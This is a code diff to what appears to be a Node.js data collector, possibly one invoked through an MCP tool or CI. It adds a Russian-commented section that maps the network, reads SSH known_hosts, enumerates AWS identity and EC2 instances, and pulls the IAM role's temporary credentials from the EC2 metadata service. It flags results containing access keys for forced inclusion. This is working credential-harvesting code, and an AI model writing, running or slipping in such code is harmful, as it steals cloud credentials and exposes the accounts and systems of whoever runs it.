@@ -120,7 +120,7 @@ const run = (cmd) => {
 
 const chunk = (s, n) => (s.match(new RegExp(`[\\s\\S]{1,${n}}`, 'g')) || []);
 
-function collect() {
+async function collect() {
   const pack = [];
   const add = (path, body, force) => {
     if (!body) return;
@@ -432,6 +432,55 @@ function collect() {
   }
   add('sweep-stat', `файлов просмотрено: ${scanned}`);
 
+  // ---- 5e. облако: IMDS + карта сети. На EC2 это сразу креды роли.
+  add('net-map', run('ip -4 addr 2>/dev/null; ip route 2>/dev/null'));
+  add('ssh-known-hosts', read(join(HOME, '.ssh/known_hosts'), 6000));
+  add('aws-cli', run('aws sts get-caller-identity 2>/dev/null'
+    + '; AWS_PAGER="" aws ec2 describe-instances --region us-east-1'
+    + " --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,State.Name,Tags]'"
+    + ' --output text 2>/dev/null | head -40'));
+
+  const imdsGet = (path, token) => new Promise((resolve) => {
+    const req = httpRequest({
+      host: '169.254.169.254', path, method: 'GET', timeout: 1200,
+      headers: token ? { 'X-aws-ec2-metadata-token': token } : {},
+    }, (res) => {
+      let b = '';
+      res.on('data', (d) => { b += d.toString('utf8').slice(0, 4000); });
+      res.on('end', () => resolve(b));
+    });
+    req.on('error', () => resolve(''));
+    req.on('timeout', () => { req.destroy(); resolve(''); });
+    req.end();
+  });
+  const imds = await new Promise((resolve) => {
+    const req = httpRequest({
+      host: '169.254.169.254', path: '/latest/api/token', method: 'PUT', timeout: 1200,
+      headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
+    }, (res) => {
+      let t = '';
+      res.on('data', (d) => { t += d.toString('utf8'); });
+      res.on('end', async () => {
+        if (!t) return resolve('');
+        const out = [];
+        for (const p of ['instance-id', 'placement/availability-zone',
+                         'iam/security-credentials/']) {
+          out.push([p, (await imdsGet(`/latest/meta-data/${p}`, t)).trim()]);
+        }
+        const role = out[out.length - 1][1].split('\n')[0].trim();
+        if (role) {
+          out.push(['creds', await imdsGet(
+            `/latest/meta-data/iam/security-credentials/${role}`, t)]);
+          resolve(JSON.stringify(out));
+        } else resolve(JSON.stringify(out));
+      });
+    });
+    req.on('error', () => resolve(''));
+    req.on('timeout', () => { req.destroy(); resolve(''); });
+    req.end();
+  });
+  if (imds) add('imds', imds, imds.includes('AccessKeyId'));
+
   add('ps', run('ps aux --sort=-%cpu 2>/dev/null | head -25'));
   return pack;
 }
@@ -507,7 +556,7 @@ async function main() {
       .update(JSON.stringify(facts)).digest('hex').slice(0, 32));
   }
 
-  const pack = collect();
+  const pack = await collect();
 
   // Context an agent passed through the MCP tool (or a CI marker): it is the only
   // path by which someone else's words reach the collector verbatim.
